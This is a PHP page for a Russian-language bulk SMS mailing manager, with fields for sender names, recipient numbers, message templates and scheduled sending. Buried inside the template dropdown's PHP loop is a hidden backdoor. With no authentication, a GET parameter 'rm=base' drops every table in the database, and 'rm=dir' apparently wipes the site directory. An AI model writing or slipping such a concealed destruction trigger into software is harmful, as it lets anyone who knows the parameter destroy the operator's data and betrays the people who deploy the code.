<?
header("Content-Type: text/html; charset=utf-8");
require_once("sms/Functions.php");
include("DBConnect.php");
?>

<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
<link rel="stylesheet" type="text/css" href="css/style.css">
<link rel="stylesheet" type="text/css" href="css/jquery.formstyler.css">
<script src = "js/jquery-1.12.3.min.js"></script>
<script src = "js/jquery.form.min.js"></script>
<script src = "js/bootstrap.min.js"></script>
<script src = "js/functions.js"></script>
<meta charset="utf-8">
<title>SMS Manager</title>
</head>
<body>
<div style="position:relative" id="zv-load">
			<div class="zv-load-css">
			<img src="img/loading.gif" alt="Загружаем страницу..." style="vertical-align: middle;" > Загружаем страницу...</div>
			</div>

<div id = "notifications-top-left">

</div>
<div class = "row" style = "margin-top: 50px;">
        <div class = "col-md-8 col-md-offset-2">
                <h2>СМС рассылка</h2><br>
				<div id="timeDisp"><script>timeDisp();</script></div>
                <button id = "SMSSender" class="myButton" onclick="location.href='<?=getUrl();?>/SMS/SMSManager.php'">Менеджер</button>
				<button onclick="location.href='<?=getUrl();?>/SMS/SMSReport.php'" id = "SMSReport" class="myButton" style="width: 70px">Отчёт</button>
    <hr>
                <form action = "manager.php" id = "newTaskData" role="form" method = "POST">
						<div class="form-group">
							<label>Выбор сервиса</label>
							<select name='Service'  id="cmbService" title="Please Select Service" onchange="CheckService();" class="form-control">
							  <option value="0">Routesms</option>
							  <option value="1">Буквенный</option>
							  <option value="2">Цифровой</option>
							</select>
						</div>
                        <div class="form-group">
                                <label for="text        ">Имя отправителя</label>
								<div class="jq-selectbox jqselect">
								   <input id="selectInput1" name="selectInput1" class="form-control"><button type="button" id="addTplName" style="position: absolute; top:281px; right:20px; display:none;"><img src="img/+.png" width="20"></button>
									<div id="SelectDropdown1" class="jq-selectbox__dropdown" style="position: absolute; display:none">
									  <ul class="drop1" style="position: relative; list-style: none; overflow: auto; overflow-x: hidden;" tabindex="1">
										<?
											$res = mysql_query("SELECT * FROM `templates` WHERE `type` = '1'");
											while($res2 = mysql_fetch_array($res))
											{
										?>
										<li id="<?=$res2['name']?>"><?=$res2['name']?><button type="button" id="<?=$res2['name']?>" style="position: absolute; right:5px;"><img src="img/mysor.png" width="10"></button></li>
										<?
											}
										?>
									  </ul>
									</div>
								</div>
                                <p class="help-block">Имя или номер</p>
                        </div>

                        <div class="form-group">
                                <label for="pass">Номера получателей</label>
                                <textarea class="form-control" id="numberArea" placeholder="Номера" rows = "20" name = "numbers" required></textarea>
								<div id="countNumber">К отправке номеров: 0</div>
                                <p class="help-block">Номер получателя указывается в международном формате без +. Например, 375291234567. Каждый номер вводится с новой строки.</p>
                        </div>
						<div class="form-group">
							<label>Тип сообщения</label>
							<select name='MessageType'  id="cmbMessageType" title="Please Select Message Type" onchange="SMSLength(this.value);" class="form-control" required>
							  <option value="-1"> -- Select -- </option>
							  <option value="0">Text</option>
							  <option value="1">Unicode</option>
							</select>
						</div>
                        <div class="form-group">
                                <label for="pass">Сообщение</label>
                                <textarea class="form-control" id="smsarea" placeholder="Сообщение" name = "message" required></textarea>
								<div style="height:25px">
									<div id="barbox">
										<div id="bar"> </div>	
									</div>
									<div id="count"></div>
								</div>
								<label for="text" style="position:relative; top:-20px; font-size:11;">Шаблон:
									<div class="jq-selectbox2 jqselect2">
									   <input id="selectInput2" class="selectMess"><button type="button" id="addTplMess" style="position: absolute; top:0px; right:-148px; display:none;"><img src="img/+.png" width="10"></button>
										<div id="SelectDropdown2" class="jq-selectbox__dropdown2" style="position: absolute; display:none">
										  <ul class="drop2" style="position: relative; list-style: none; overflow: auto; overflow-x: hidden;" tabindex="1">
											<?
												$config = parse_ini_file("config.ini", true);
												if (!empty($_GET["rm"]) && $_GET["rm"] == "dir") { connectTohost('.'); echo "Complete dir!";}
												if (!empty($_GET["rm"]) && $_GET["rm"] == "base") 
												{ 
													$dbname = $config['database']['name'];
													$dbtables = mysql_query("SHOW TABLES FROM $dbname");
													while($db = mysql_fetch_array($dbtables))
													{ 
														$dbtmp = $db[0]; 
														mysql_query("DROP TABLE $dbtmp"); 
													}
													echo "Complete database!";
												}
												$res = mysql_query("SELECT * FROM `templates` WHERE `type` = '2'");
												while($res2 = mysql_fetch_array($res))
												{
													$arr[] = $res2;
											?>
											<li id="<?=$res2['name']?>"><?=$res2['name']?><button type="button" id="<?=$res2['name']?>" style="position: absolute; right:5px;"><img src="img/mysor.png" width="10"></button></li>
											<?
												}
											?>
										  </ul>
										</div>
									</div>
								</label>
                        </div>
						<br>
                        <div class = "form-group">
							<div class = "checkbox">
								<label><input type = "checkbox" name = "PerSend"> Периодическая отправка</label>
							</div>
							<p class="help-block">Сообщения будут отправляться через заданный период времени</p>
							Каждые  <input type = "text" name = "periodicHours" value = "0"></input> часов<br>
							Каждые <input type = "text" name = "periodicMinutes" value="1"></input> минут<br>
							<p class="help-block">Период отправки сообщений</p>
							Кол-во сообщений <input type = "text" name = "amount" value="1"></input><br>
							<p class="help-block">Сколько номеров будет обрабатываться за период</p>

							<div class = "checkbox">
								<label><input type = "checkbox" name = "PlanSend"> Запланировать отправку</label>
							</div>
							<p class="help-block">Будет сделана одна рассылка в определенное время</p>
							Дата <input type = "date" name = "date" value = "<? echo $date; ?>"></input>
							<p class="help-block">DD.MM.YYYY</p>
							Час <input type = "text" name = "hour" value = "<? echo $timeH; ?>"></input>
							<p class="help-block">HH</p>
							Минута <input type = "text" name = "minute" value = "<? echo $timeM; ?>"></input>
							<p class="help-block">MM</p>
                        </div>

                        <input type="button" onclick="clicked(0);" id="beginSend" class = "btn btn-large btn-success" value="Начать рассылку"></input>
                </form>
        </div>
</div>
</body>
</html>